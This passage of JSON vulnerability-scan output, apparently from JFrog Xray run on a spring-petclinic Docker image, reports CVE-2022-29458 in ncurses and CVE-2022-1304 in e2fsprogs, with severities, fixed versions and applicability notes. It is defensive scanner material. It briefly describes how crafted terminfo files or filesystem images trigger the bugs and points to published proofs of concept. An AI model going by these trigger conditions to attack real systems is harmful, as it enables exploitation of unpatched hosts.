                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "5.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:P",
                     "cvss_v3": "7.1/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "ncurses 6.3 before patch 20220416 has an out-of-bounds read and segmentation violation in convert_strings in tinfo/read_entry.c in the terminfo library.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-05-18T07:43:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-208564",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds read in ncurses terminfo leads to memory leakage.",
            "FullDescription": "[ncurses](https://invisible-mirror.net/archives/ncurses/) (new curses) is a programming library providing an application programming interface (API) that allows the programmer to write text-based user interfaces (TUI) in a terminal-independent manner. It is a toolkit for developing \"GUI-like\" application software that runs under a terminal emulator.\n\nThe `convert_strings` function in the `terminfo` module of `ncurses` is vulnerable to an out-of-bounds read, leading to memory leakage. The bug is triggerable by means of the `/progs/tic` tool that ships with ncurses and compiles a terminfo source. An example of running the tic tool - \n```\n/progs/tic -o /path/to/output/directory/ <TIC_SOURCE_FILEPATH>\n```\nThe vulnerability can be triggered when the attacker controls the contents of the TIC_SOURCE file.\n\nThe [PoC](https://lists.gnu.org/archive/html/bug-ncurses/2022-04/msg00014.html) published is a terminfo file with special characters and Unicode characters leading to a memory leakage and a crash when reading a bad address. It is hardly usable by an attacker as the leaked memory either causes a crash - and so the data leaked is not obtainable - or written to a local output file, which doesn't benefit remote attackers.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Either leads to a client program DoS or to a memory leak into a local file.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Remote exploitation is unlikely to happen or to be beneficial for the attacker.\n\nThe attacker should be able to control the contents of the terminfo source file, when the `tic` command is run -\n`/progs/tic -o /path/to/output/directory/ <TIC_SOURCE_FILEPATH>`\n\nIn addition, the attacker must find a way to get the output file with the leaked memory information, which is very unlikely to happen.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A PoC has been published to reproduce the bug to leak memory contents.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC leading to memory leakage and a crash",
                  "Url": "https://lists.gnu.org/archive/html/bug-ncurses/2022-04/msg00014.html",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://lists.gnu.org/archive/html/bug-ncurses/2022-04/msg00017.html",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
            "cve_id": "CVE-2022-29458",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \"tic\" CLI tool with attacker-supplied input",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
            "vulnerability_id": "CVE-2022-29458",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-208564",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "ncurses 6.3 before patch 20220416 has an out-of-bounds read and segmentation violation in convert_strings in tinfo/read_entry.c in the terminfo library.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:ncurses-bin",
         "source_id": "deb://debian:bullseye:ncurses-bin",
         "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
         "component_versions": {
            "id": "debian:bullseye:ncurses",
            "vulnerable_versions": [
               "< 6.2+20201114-2+deb11u1"
            ],
            "fixed_versions": [
               "6.2+20201114-2+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-29458",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "5.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:P",
                     "cvss_v3": "7.1/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "ncurses 6.3 before patch 20220416 has an out-of-bounds read and segmentation violation in convert_strings in tinfo/read_entry.c in the terminfo library.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-05-18T07:43:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-208564",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds read in ncurses terminfo leads to memory leakage.",
            "FullDescription": "[ncurses](https://invisible-mirror.net/archives/ncurses/) (new curses) is a programming library providing an application programming interface (API) that allows the programmer to write text-based user interfaces (TUI) in a terminal-independent manner. It is a toolkit for developing \"GUI-like\" application software that runs under a terminal emulator.\n\nThe `convert_strings` function in the `terminfo` module of `ncurses` is vulnerable to an out-of-bounds read, leading to memory leakage. The bug is triggerable by means of the `/progs/tic` tool that ships with ncurses and compiles a terminfo source. An example of running the tic tool - \n```\n/progs/tic -o /path/to/output/directory/ <TIC_SOURCE_FILEPATH>\n```\nThe vulnerability can be triggered when the attacker controls the contents of the TIC_SOURCE file.\n\nThe [PoC](https://lists.gnu.org/archive/html/bug-ncurses/2022-04/msg00014.html) published is a terminfo file with special characters and Unicode characters leading to a memory leakage and a crash when reading a bad address. It is hardly usable by an attacker as the leaked memory either causes a crash - and so the data leaked is not obtainable - or written to a local output file, which doesn't benefit remote attackers.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Either leads to a client program DoS or to a memory leak into a local file.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Remote exploitation is unlikely to happen or to be beneficial for the attacker.\n\nThe attacker should be able to control the contents of the terminfo source file, when the `tic` command is run -\n`/progs/tic -o /path/to/output/directory/ <TIC_SOURCE_FILEPATH>`\n\nIn addition, the attacker must find a way to get the output file with the leaked memory information, which is very unlikely to happen.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A PoC has been published to reproduce the bug to leak memory contents.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC leading to memory leakage and a crash",
                  "Url": "https://lists.gnu.org/archive/html/bug-ncurses/2022-04/msg00014.html",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://lists.gnu.org/archive/html/bug-ncurses/2022-04/msg00017.html",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
            "cve_id": "CVE-2022-29458",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \"tic\" CLI tool with attacker-supplied input",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
            "vulnerability_id": "CVE-2022-29458",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-208564",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "ncurses 6.3 before patch 20220416 has an out-of-bounds read and segmentation violation in convert_strings in tinfo/read_entry.c in the terminfo library.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:ncurses-base",
         "source_id": "deb://debian:bullseye:ncurses-base",
         "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
         "component_versions": {
            "id": "debian:bullseye:ncurses",
            "vulnerable_versions": [
               "< 6.2+20201114-2+deb11u1"
            ],
            "fixed_versions": [
               "6.2+20201114-2+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-29458",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "5.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:P",
                     "cvss_v3": "7.1/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "ncurses 6.3 before patch 20220416 has an out-of-bounds read and segmentation violation in convert_strings in tinfo/read_entry.c in the terminfo library.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-05-18T07:43:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-208564",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds read in ncurses terminfo leads to memory leakage.",
            "FullDescription": "[ncurses](https://invisible-mirror.net/archives/ncurses/) (new curses) is a programming library providing an application programming interface (API) that allows the programmer to write text-based user interfaces (TUI) in a terminal-independent manner. It is a toolkit for developing \"GUI-like\" application software that runs under a terminal emulator.\n\nThe `convert_strings` function in the `terminfo` module of `ncurses` is vulnerable to an out-of-bounds read, leading to memory leakage. The bug is triggerable by means of the `/progs/tic` tool that ships with ncurses and compiles a terminfo source. An example of running the tic tool - \n```\n/progs/tic -o /path/to/output/directory/ <TIC_SOURCE_FILEPATH>\n```\nThe vulnerability can be triggered when the attacker controls the contents of the TIC_SOURCE file.\n\nThe [PoC](https://lists.gnu.org/archive/html/bug-ncurses/2022-04/msg00014.html) published is a terminfo file with special characters and Unicode characters leading to a memory leakage and a crash when reading a bad address. It is hardly usable by an attacker as the leaked memory either causes a crash - and so the data leaked is not obtainable - or written to a local output file, which doesn't benefit remote attackers.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Either leads to a client program DoS or to a memory leak into a local file.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Remote exploitation is unlikely to happen or to be beneficial for the attacker.\n\nThe attacker should be able to control the contents of the terminfo source file, when the `tic` command is run -\n`/progs/tic -o /path/to/output/directory/ <TIC_SOURCE_FILEPATH>`\n\nIn addition, the attacker must find a way to get the output file with the leaked memory information, which is very unlikely to happen.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A PoC has been published to reproduce the bug to leak memory contents.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC leading to memory leakage and a crash",
                  "Url": "https://lists.gnu.org/archive/html/bug-ncurses/2022-04/msg00014.html",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://lists.gnu.org/archive/html/bug-ncurses/2022-04/msg00017.html",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
            "cve_id": "CVE-2022-29458",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \"tic\" CLI tool with attacker-supplied input",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
            "vulnerability_id": "CVE-2022-29458",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-203593",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "An out-of-bounds read/write vulnerability was found in e2fsprogs 1.46.5. This issue leads to a segmentation fault and possibly arbitrary code execution via a specially crafted filesystem.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libext2fs2",
         "source_id": "deb://debian:bullseye:libext2fs2",
         "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
         "component_versions": {
            "id": "debian:bullseye:e2fsprogs",
            "vulnerable_versions": [
               "< 1.46.2-2+deb11u1"
            ],
            "fixed_versions": [
               "1.46.2-2+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-1304",
                     "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "An out-of-bounds read/write vulnerability was found in e2fsprogs 1.46.5. This issue leads to a segmentation fault and possibly arbitrary code execution via a specially crafted filesystem.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-203593",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds write in e2fsck can lead to local privilege escalation when processing a crafted filesystem image.",
            "FullDescription": "[e2fsprogs](http://e2fsprogs.sourceforge.net/) is a set of utilities for maintaining the ext2, ext3 and ext4 file systems. Since those file systems are often the default for Linux distributions, it is commonly considered to be essential software.\n\nA crafted malicious filesystem can cause a segmentation fault and arbitrary code execution in e2fsprogs. \n\nHowever, the attacker should either find an input that propagates and turns out to be passed to the `e2fsck` tool or use another vulnerability to upload the malicious filesystem image and find a way to pass it to `e2fsck`.\n\nIt’s highly unlikely a remote service would use the `e2fsck` tool on externally supplied input.",
            "Impact": 4,
            "VulnerabilityType": "Local privilege escalation",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "The attack must be performed locally, as it’s highly unlikely a remote service would use the `e2fsck` tool on externally supplied input.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "The Denial-of-Service impact is mitigated since the only known attack vector is by running a forked process (`e2fsck`). Crashing a forked client process is usually not a severe impact. Also, the e2fsprogs tools are userland utilities, thus not affecting the kernel and cannot lead to a container escape.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A Proof-of-Concept which leads to a Denial-of-Service was published by the reporting researcher.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "Requires the user to run the `e2fsck` tool on a crafted filesystem.",
                  "IsPositive": 1,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must be able to put a crafted filesystem image on the target filesystem and have a privileged user execute the `e2fsck` tool on this image.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.kernel.org/pub/scm/fs/ext2/e2fsprogs.git/commit/?h=maint&id=ab51d587bb9b229b1fade1afd02e1574c1ba5c76",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
            "cve_id": "CVE-2022-1304",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \"e2fsck\" CLI tool with an attacker-supplied image/device.",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
            "vulnerability_id": "CVE-2022-1304",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-203593",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "An out-of-bounds read/write vulnerability was found in e2fsprogs 1.46.5. This issue leads to a segmentation fault and possibly arbitrary code execution via a specially crafted filesystem.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libcom-err2",
         "source_id": "deb://debian:bullseye:libcom-err2",
         "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
         "component_versions": {
            "id": "debian:bullseye:e2fsprogs",
            "vulnerable_versions": [
               "< 1.46.2-2+deb11u1"
            ],
            "fixed_versions": [
               "1.46.2-2+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-1304",
                     "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "An out-of-bounds read/write vulnerability was found in e2fsprogs 1.46.5. This issue leads to a segmentation fault and possibly arbitrary code execution via a specially crafted filesystem.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-203593",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds write in e2fsck can lead to local privilege escalation when processing a crafted filesystem image.",
            "FullDescription": "[e2fsprogs](http://e2fsprogs.sourceforge.net/) is a set of utilities for maintaining the ext2, ext3 and ext4 file systems. Since those file systems are often the default for Linux distributions, it is commonly considered to be essential software.\n\nA crafted malicious filesystem can cause a segmentation fault and arbitrary code execution in e2fsprogs. \n\nHowever, the attacker should either find an input that propagates and turns out to be passed to the `e2fsck` tool or use another vulnerability to upload the malicious filesystem image and find a way to pass it to `e2fsck`.\n\nIt’s highly unlikely a remote service would use the `e2fsck` tool on externally supplied input.",
            "Impact": 4,
            "VulnerabilityType": "Local privilege escalation",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "The attack must be performed locally, as it’s highly unlikely a remote service would use the `e2fsck` tool on externally supplied input.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "The Denial-of-Service impact is mitigated since the only known attack vector is by running a forked process (`e2fsck`). Crashing a forked client process is usually not a severe impact. Also, the e2fsprogs tools are userland utilities, thus not affecting the kernel and cannot lead to a container escape.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A Proof-of-Concept which leads to a Denial-of-Service was published by the reporting researcher.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "Requires the user to run the `e2fsck` tool on a crafted filesystem.",
                  "IsPositive": 1,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must be able to put a crafted filesystem image on the target filesystem and have a privileged user execute the `e2fsck` tool on this image.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.kernel.org/pub/scm/fs/ext2/e2fsprogs.git/commit/?h=maint&id=ab51d587bb9b229b1fade1afd02e1574c1ba5c76",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
            "cve_id": "CVE-2022-1304",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \"e2fsck\" CLI tool with an attacker-supplied image/device.",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
            "vulnerability_id": "CVE-2022-1304",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-203593",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "An out-of-bounds read/write vulnerability was found in e2fsprogs 1.46.5. This issue leads to a segmentation fault and possibly arbitrary code execution via a specially crafted filesystem.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libss2",
         "source_id": "deb://debian:bullseye:libss2",
         "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
         "component_versions": {
            "id": "debian:bullseye:e2fsprogs",
            "vulnerable_versions": [
               "< 1.46.2-2+deb11u1"
            ],
            "fixed_versions": [
               "1.46.2-2+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-1304",
                     "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "An out-of-bounds read/write vulnerability was found in e2fsprogs 1.46.5. This issue leads to a segmentation fault and possibly arbitrary code execution via a specially crafted filesystem.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-203593",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds write in e2fsck can lead to local privilege escalation when processing a crafted filesystem image.",
            "FullDescription": "[e2fsprogs](http://e2fsprogs.sourceforge.net/) is a set of utilities for maintaining the ext2, ext3 and ext4 file systems. Since those file systems are often the default for Linux distributions, it is commonly considered to be essential software.\n\nA crafted malicious filesystem can cause a segmentation fault and arbitrary code execution in e2fsprogs. \n\nHowever, the attacker should either find an input that propagates and turns out to be passed to the `e2fsck` tool or use another vulnerability to upload the malicious filesystem image and find a way to pass it to `e2fsck`.\n\nIt’s highly unlikely a remote service would use the `e2fsck` tool on externally supplied input.",
            "Impact": 4,
            "VulnerabilityType": "Local privilege escalation",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "The attack must be performed locally, as it’s highly unlikely a remote service would use the `e2fsck` tool on externally supplied input.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "The Denial-of-Service impact is mitigated since the only known attack vector is by running a forked process (`e2fsck`). Crashing a forked client process is usually not a severe impact. Also, the e2fsprogs tools are userland utilities, thus not affecting the kernel and cannot lead to a container escape.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A Proof-of-Concept which leads to a Denial-of-Service was published by the reporting researcher.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "Requires the user to run the `e2fsck` tool on a crafted filesystem.",
                  "IsPositive": 1,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must be able to put a crafted filesystem image on the target filesystem and have a privileged user execute the `e2fsck` tool on this image.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.kernel.org/pub/scm/fs/ext2/e2fsprogs.git/commit/?h=maint&id=ab51d587bb9b229b1fade1afd02e1574c1ba5c76",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
            "cve_id": "CVE-2022-1304",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \"e2fsck\" CLI tool with an attacker-supplied image/device.",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
            "vulnerability_id": "CVE-2022-1304",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-203593",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "An out-of-bounds read/write vulnerability was found in e2fsprogs 1.46.5. This issue leads to a segmentation fault and possibly arbitrary code execution via a specially crafted filesystem.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:logsave",
         "source_id": "deb://debian:bullseye:logsave",
         "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
         "component_versions": {
            "id": "debian:bullseye:e2fsprogs",
            "vulnerable_versions": [
               "< 1.46.2-2+deb11u1"
            ],
            "fixed_versions": [
               "1.46.2-2+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-1304",
